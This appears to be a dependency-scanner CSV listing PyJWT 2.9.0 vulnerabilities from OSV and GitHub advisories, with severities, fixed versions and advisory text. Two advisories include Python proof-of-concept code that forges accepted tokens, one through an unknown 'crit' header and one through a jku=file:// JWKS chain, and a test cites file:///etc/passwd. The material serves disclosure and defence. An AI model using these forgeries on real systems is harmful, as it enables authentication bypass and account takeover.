package,version,ecosystem,source_file,osv_id,aliases,summary,cvss_vector,severity_score,fixed_version,published,modified,details,references
pyjwt,2.9.0,PyPI,/Users/akshathr/Clones/recallai-meeting/requirements.txt,PYSEC-2025-183,CVE-2025-45768,,CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H,,,2025-07-31T21:15:27.320Z,2026-05-21T15:00:28.178881228Z,"pyjwt v2.10.1 was discovered to contain weak encryption. NOTE: this is disputed by the Supplier because the key length is chosen by the application that uses the library (admittedly, library users may benefit from a minimum value and a mechanism for opting in to strict enforcement).",https://github.com/jpadilla
pyjwt,2.9.0,PyPI,/Users/akshathr/Clones/recallai-meeting/requirements.txt,PYSEC-2026-120,CVE-2026-32597 | GHSA-752w-5fwx-jx9f,,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N,,2.12.0,2026-03-13T19:55:09.500Z,2026-05-20T09:19:15.426301Z,"PyJWT is a JSON Web Token implementation in Python. Prior to 2.12.0, PyJWT does not validate the crit (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a crit array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the MUST requirement in the RFC. This vulnerability is fixed in 2.12.0.",https://lists.debian.org/debian-lts-announce/2026/05/msg00008.html
pyjwt,2.9.0,PyPI,/Users/akshathr/Clones/recallai-meeting/requirements.txt,PYSEC-2026-175,CVE-2026-48522 | GHSA-993g-76c3-p5m4,,CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N,,2.13.0,2026-05-28T16:16:29.150Z,2026-06-02T12:15:09.282275410Z,"PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient passes its uri argument directly to urllib.request.urlopen() which uses Python stdlib's default OpenerDirector registering HTTPHandler, HTTPSHandler, FTPHandler, FileHandler, and DataHandler. There is currently no documented option to restrict which schemes PyJWKClient will fetch. If an application's jku URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can cause PyJWKClient to read arbitrary local files via file:// (SSRF on local filesystem), cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface), or forge tokens that PyJWT verifies as valid. The library does not directly return non-HTTP(S) URI contents to the attacker; the chained ""plant a JWKS to forge tokens"" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. This vulnerability is fixed in 2.13.0.",https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4
pyjwt,2.9.0,PyPI,/Users/akshathr/Clones/recallai-meeting/requirements.txt,PYSEC-2026-176,CVE-2026-48523 | GHSA-jq35-7prp-9v3f,,CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N,,2.12.1,2026-05-28T16:16:29.280Z,2026-06-02T12:15:10.358230706Z,"PyJWT is a JSON Web Token implementation in Python. From 2.9.0 to 2.12.1, there is a verifier-side algorithm allow-list bypass when jwt.decode() or jwt.decode_complete() are called with a PyJWK key. The token header alg is checked against the caller-supplied algorithms allow-list, but signature verification is performed with the algorithm bound to the PyJWK object instead of the header algorithm. An attacker who controls a registered JWK/JWKS private key can sign with a disallowed algorithm, advertise an allowed algorithm in the JWT header, and still be accepted. The issue affects the documented PyJWKClient.get_signing_key_from_jwt(...) flow. This vulnerability is fixed in 2.13.0.",https://github.com/jpadilla/pyjwt/security/advisories/GHSA-jq35-7prp-9v3f
pyjwt,2.9.0,PyPI,/Users/akshathr/Clones/recallai-meeting/requirements.txt,PYSEC-2026-177,CVE-2026-48524 | GHSA-fhv5-28vv-h8m8,,CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L,,2.13.0,2026-05-28T16:16:29.403Z,2026-06-02T12:15:10.363704191Z,"PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests. The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. This vulnerability is fixed in 2.13.0.",https://github.com/jpadilla/pyjwt/security/advisories/GHSA-fhv5-28vv-h8m8
pyjwt,2.9.0,PyPI,/Users/akshathr/Clones/recallai-meeting/requirements.txt,PYSEC-2026-178,CVE-2026-48525 | GHSA-w7vc-732c-9m39,,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L,,2.13.0,2026-05-28T16:16:29.533Z,2026-06-02T12:15:10.739334903Z,"PyJWT is a JSON Web Token implementation in Python. From 2.8.0 to 2.12.1, when verifying detached JWS tokens using the unencoded-payload option (""b64"": false, RFC 7797), PyJWT performs Base64URL decoding of the compact-serialization payload segment before enforcing the detached-payload rules. For b64=false, PyJWT later discards that decoded payload and replaces it with the caller-provided detached_payload. In practice, this turns the middle segment into an attacker-controlled “work amplifier”: a remote client can supply an arbitrarily large Base64URL payload segment that forces CPU work + memory allocations even if the signature is invalid. This creates an unauthenticated DoS vector against any endpoint that verifies detached JWS using PyJWT. This vulnerability is fixed in 2.13.0.",https://github.com/jpadilla/pyjwt/security/advisories/GHSA-w7vc-732c-9m39
pyjwt,2.9.0,PyPI,/Users/akshathr/Clones/recallai-meeting/requirements.txt,PYSEC-2026-179,CVE-2026-48526 | GHSA-xgmm-8j9v-c9wx,,CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N,,2.13.0,2026-05-28T16:16:29.657Z,2026-06-02T12:15:10.840770477Z,"PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, when the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm. This vulnerability is fixed in 2.13.0.",https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx
pyjwt,2.9.0,PyPI,/Users/akshathr/Clones/recallai-meeting/requirements.txt,GHSA-752w-5fwx-jx9f,CVE-2026-32597 | PYSEC-2026-120,PyJWT accepts unknown `crit` header extensions,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N,HIGH,2.12.0,2026-03-13T20:05:04Z,2026-06-08T19:15:12.447890578Z,"## Summary  PyJWT does not validate the `crit` (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a `crit` array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the **MUST** requirement in the RFC.  This is the same class of vulnerability as CVE-2025-59420 (Authlib), which received CVSS 7.5 (HIGH).  ---  ## RFC Requirement  RFC 7515 §4.1.11:  > The ""crit"" (Critical) Header Parameter indicates that extensions to this > specification and/or [JWA] are being used that **MUST** be understood and > processed. [...] If any of the listed extension Header Parameters are > **not understood and supported** by the recipient, then the **JWS is invalid**.  ---  ## Proof of Concept  ```python import jwt  # PyJWT 2.8.0 import hmac, hashlib, base64, json  # Construct token with unknown critical extension header = {""alg"": ""HS256"", ""crit"": [""x-custom-policy""], ""x-custom-policy"": ""require-mfa""} payload = {""sub"": ""attacker"", ""role"": ""admin""}  def b64url(data):     return base64.urlsafe_b64encode(data).rstrip(b""="").decode()  h = b64url(json.dumps(header, separators=("","", "":"")).encode()) p = b64url(json.dumps(payload, separators=("","", "":"")).encode()) sig = b64url(hmac.new(b""secret"", f""{h}.{p}"".encode(), hashlib.sha256).digest()) token = f""{h}.{p}.{sig}""  # Should REJECT — x-custom-policy is not understood by PyJWT try:     result = jwt.decode(token, ""secret"", algorithms=[""HS256""])     print(f""ACCEPTED: {result}"")     # Output: ACCEPTED: {'sub': 'attacker', 'role': 'admin'} except Exception as e:     print(f""REJECTED: {e}"") ```  **Expected:** `jwt.exceptions.InvalidTokenError: Unsupported critical extension: x-custom-policy` **Actual:** Token accepted, payload returned.  ### Comparison with RFC-compliant library  ```python # jwcrypto — correctly rejects from jwcrypto import jwt as jw_jwt, jwk key = jwk.JWK(kty=""oct"", k=b64url(b""secret"")) jw_jwt.JWT(jwt=token, key=key, algs=[""HS256""]) # raises: InvalidJWSObject('Unknown critical header: ""x-custom-policy""') ```  ---  ## Impact  - **Split-brain verification** in mixed-library deployments (e.g., API   gateway using jwcrypto rejects, backend using PyJWT accepts) - **Security policy bypass** when `crit` carries enforcement semantics   (MFA, token binding, scope restrictions) - **Token binding bypass** — RFC 7800 `cnf` (Proof-of-Possession) can be   silently ignored - See CVE-2025-59420 for full impact analysis  ---  ## Suggested Fix  In `jwt/api_jwt.py`, add validation in `_validate_headers()` or `decode()`:  ```python _SUPPORTED_CRIT = {""b64""}  # Add extensions PyJWT actually supports  def _validate_crit(self, headers: dict) -> None:     crit = headers.get(""crit"")     if crit is None:         return     if not isinstance(crit, list) or len(crit) == 0:         raise InvalidTokenError(""crit must be a non-empty array"")     for ext in crit:         if ext not in self._SUPPORTED_CRIT:             raise InvalidTokenError(f""Unsupported critical extension: {ext}"")         if ext not in headers:             raise InvalidTokenError(f""Critical extension {ext} not in header"") ```  ---  ## CWE  - CWE-345: Insufficient Verification of Data Authenticity - CWE-863: Incorrect Authorization  ## References  - [RFC 7515 §4.1.11](https://www.rfc-editor.org/rfc/rfc7515.html#section-4.1.11) - [CVE-2025-59420 — Authlib crit bypass (CVSS 7.5)](https://osv.dev/vulnerability/GHSA-9ggr-2464-2j32) - [RFC 7800 — Proof-of-Possession Key Semantics](https://www.rfc-editor.org/rfc/rfc7800)",https://nvd.nist.gov/vuln/detail/CVE-2026-32597
pyjwt,2.9.0,PyPI,/Users/akshathr/Clones/recallai-meeting/requirements.txt,GHSA-993g-76c3-p5m4,CVE-2026-48522 | PYSEC-2026-175,"PyJWKClient: missing scheme allowlist enables CVE-2024-21643-class SSRF + token forgery via file://, ftp://, data: schemes",CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N,MODERATE,2.13.0,2026-06-15T19:28:41Z,2026-07-31T22:15:22.444788060Z,"> [!NOTE] > The library does not directly return non-HTTP(S) URI contents to the attacker; the chained ""plant a JWKS to forge tokens"" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. Severity is scored for the scheme-acceptance bug in isolation.  ## Summary  PyJWKClient passes its `uri` argument directly to `urllib.request.urlopen()` which uses Python stdlib's default `OpenerDirector` registering `HTTPHandler`, `HTTPSHandler`, `FTPHandler`, **`FileHandler`**, and `DataHandler`. There is currently no documented option to restrict which schemes PyJWKClient will fetch.  If an application's `jku` URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can:  1. Cause PyJWKClient to read arbitrary local files via `file://` (SSRF on local filesystem) — the file's contents are passed to `json.load`. 2. Cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface). 3. **Forge tokens that PyJWT verifies as valid** — if the attacker can write to any path the JKU URL points at AND influences the URL, they can plant a JWK Set containing their own public key, sign tokens with the matching private key, and `jwt.decode()` accepts.  ## Affected versions  Tested and reproducible on **PyJWT 2.11.0 and 2.12.1**. Likely all versions back to PyJWKClient introduction.  ## Reproducer (full attack chain — verified empirically)  ```python import jwt as pyjwt from jwt import PyJWKClient from cryptography.hazmat.primitives.asymmetric import rsa from cryptography.hazmat.primitives import serialization import json, base64, time  # Attacker generates keypair (no relation to real IdP) key = rsa.generate_private_key(public_exponent=65537, key_size=2048) pub_n = key.public_key().public_numbers().n  def b64u(n):     bl = (n.bit_length() + 7) // 8     return base64.urlsafe_b64encode(n.to_bytes(bl, 'big')).rstrip(b'=').decode()  # Attacker writes JWK Set containing their public key to /tmp jwks = {""keys"":[{""kty"":""RSA"",""kid"":""attacker"",""use"":""sig"",""alg"":""RS256"",                   ""n"":b64u(pub_n),""e"":""AQAB""}]} with open(""/tmp/attacker.json"",""w"") as f:     json.dump(jwks, f)  # Attacker mints token signed with their private key, jku=file:// priv_pem = key.private_bytes(serialization.Encoding.PEM,     serialization.PrivateFormat.PKCS8, serialization.NoEncryption()) now = int(time.time()) token = pyjwt.encode(     {""sub"":""attacker"",""aud"":""target-app"",""iat"":now,""exp"":now+3600},     priv_pem, algorithm=""RS256"",     headers={""kid"":""attacker"",""jku"":""file:///tmp/attacker.json"",""typ"":""JWT""})  # Vulnerable application pattern: caller derives jku from token header # and passes to PyJWKClient without scheme validation header = pyjwt.get_unverified_header(token) client = PyJWKClient(header[""jku""])      # <-- accepts file:// silently key_obj = client.get_signing_key_from_jwt(token) decoded = pyjwt.decode(token, key_obj.key, algorithms=[""RS256""],                        audience=""target-app"") print(""Token verified:"", decoded) # Output: Token verified: {'sub': 'attacker', 'aud': 'target-app', ...} ```  ## Cross-library evidence — PyJWT is the outlier  The same composition pattern is structurally safe in 4 other mainstream JWT libraries:  | Library | Behavior on `jku=file://...` | Mechanism | |---|---|---| | **PyJWT 2.12.1** (Python) | **Reads file from disk, parses, uses for signature verification** | urllib default OpenerDirector includes FileHandler | | panva/jose 6.2.3 (Node.js) | Refuses pre-fetch | WHATWG `fetch()` rejects non-http(s) at fetch-spec layer | | golang-jwt + MicahParks/keyfunc v3.4.0 (Go) | Refuses pre-fetch | `http.DefaultTransport` only registers http/https | | Microsoft.IdentityModel.Tokens 8.18.0 (.NET) | Refuses pre-fetch | `HttpDocumentRetriever` defaults `RequireHttps=true` | | Spring Security NimbusJwtDecoder 6.3.4 (Java) | Refuses pre-fetch | URI parser delegation refuses non-http(s) at request build |  PyJWT is the only library of these 5 where the default behavior allows `file://` to reach the fetch layer.  ## Recommended fix  Add `allowed_schemes: tuple[str, ...] = (""https"", ""http"")` kwarg to `PyJWKClient.__init__`. Pre-validate URL scheme before invoking `urllib.request.urlopen`. URLs with disallowed schemes raise `PyJWKClientError` before any fetch is attempted.  ### Diff sketch against `jwt/jwks_client.py`  ```python def __init__(     self, uri: str,     cache_keys: bool = False, max_cached_keys: int = 16,     cache_jwk_set: bool = True, lifespan: float = 300,     headers: dict[str, Any] | None = None, timeout: float = 30,     ssl_context: SSLContext | None = None,     allowed_schemes: tuple[str, ...] = (""https"", ""http""),  # NEW ):     """"""...     :param allowed_schemes: URL schemes the JWKS endpoint is permitted         to use. Default ``(""https"", ""http"")``. Pass ``(""https"",)`` for         HTTPS-only operation. URLs with disallowed schemes raise         ``PyJWKClientError`` before any fetch is attempted.     """"""     # ... existing init code ...     self.allowed_schemes = allowed_schemes     self._validate_uri_scheme()   def _validate_uri_scheme(self) -> None:     """"""Reject the configured URI early if its scheme isn't allowed.""""""     from urllib.parse import urlparse     parsed = urlparse(self.uri)     scheme = parsed.scheme.lower()     if not scheme:         raise PyJWKClientError(             f""PyJWKClient URI '{self.uri}' has no scheme; expected one of ""             f""{self.allowed_schemes!r}"")     if scheme not in self.allowed_schemes:         raise PyJWKClientError(             f""PyJWKClient URI scheme '{scheme}' is not in allowed_schemes ""             f""{self.allowed_schemes!r}; refusing to fetch from this URL"") ```  ### Tests to add  ```python def test_pyjwkclient_rejects_file_scheme():     with pytest.raises(PyJWKClientError, match=""not in allowed_schemes""):         PyJWKClient(""file:///etc/passwd"")  def test_pyjwkclient_rejects_ftp_scheme():     with pytest.raises(PyJWKClientError):         PyJWKClient(""ftp://example.org/keys.json"")  def test_pyjwkclient_rejects_data_scheme():     with pytest.raises(PyJWKClientError):         PyJWKClient('data:application/json,{""keys"":[]}')  def test_pyjwkclient_caller_can_lock_to_https_only():     with pytest.raises(PyJWKClientError):         PyJWKClient(""http://internal.test/jwks.json"", allowed_schemes=(""https"",)) ```  ### Compatibility  - Default `allowed_schemes=(""https"", ""http"")` preserves backwards compatibility for the overwhelming majority of callers using HTTP/HTTPS JWKS endpoints - Breaking only for callers using non-HTTP schemes intentionally (vanishingly rare) - No changes to urllib fetch logic itself — the fix is a pre-validation gate  ## Class precedent  This is the same class as **CVE-2024-21643** (Apache Jena JKU-trust: attacker-supplied JKU URL fetched without scheme validation). NVD-rated CVSS 7.5.  ## Prior art (verified 2026-05-06)  Confirmed via live recon (NVD direct, OSV.dev, PyJWT GitHub Security Advisories, issue/PR keyword search, CHANGELOG inspection):  - No existing CVE on PyJWT specifically for PyJWKClient URL scheme handling - No existing GitHub issue or PR addressing scheme allowlisting - No silent fix in CHANGELOG through 2.12.1 - 5 prior PyJWT advisories (CVE-2017-11424, CVE-2022-29217, CVE-2024-53861, CVE-2025-45768, CVE-2026-32597) — none cover this class  ## Credit  Reported by Keijo Tuominen — independent security research at CMHT.tech (https://cmht.tech).  Reproduction artifacts available on request: full multi-language probe pack (5 wrappers × 25 fixtures × 125 cells) demonstrating cross-library divergence at the URL-scheme boundary.",https://nvd.nist.gov/vuln/detail/CVE-2026-48522
pyjwt,2.9.0,PyPI,/Users/akshathr/Clones/recallai-meeting/requirements.txt,GHSA-fhv5-28vv-h8m8,CVE-2026-48524 | PYSEC-2026-177,PyJWKClient unbounded JWKS endpoint requests via attacker-controlled kid values (DoS),CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L,LOW,2.13.0,2026-06-15T17:28:46Z,2026-07-31T22:15:22.446184166Z,"> [!NOTE] >  The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. Impact is reduced auth availability until the next successful fetch, not complete denial of service.  ## Summary PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests.  Additionally, fetch_data() finally block clears the JWKS cache on network error.  ## Root Cause jwt/jwks_client.py:172-198 - get_signing_key(kid) calls get_signing_keys(refresh=True) for unknown kids, bypassing TTL cache with no cooldown. jwt/jwks_client.py:120-122 - finally block writes None to cache on error, clearing valid data.  ## Impact - DoS against JWKS endpoint (unlimited requests per invalid token) - DoS against application (network I/O latency) - Cascading failure (rate limiting clears cache, breaking legitimate auth)  ## Suggested Fix 1. Add refresh cooldown (refuse refresh more than once per TTL period) 2. Move cache write from finally to else block  ## Affected Versions All versions with PyJWKClient (2.4.0 through 2.12.1)",https://nvd.nist.gov/vuln/detail/CVE-2026-48524
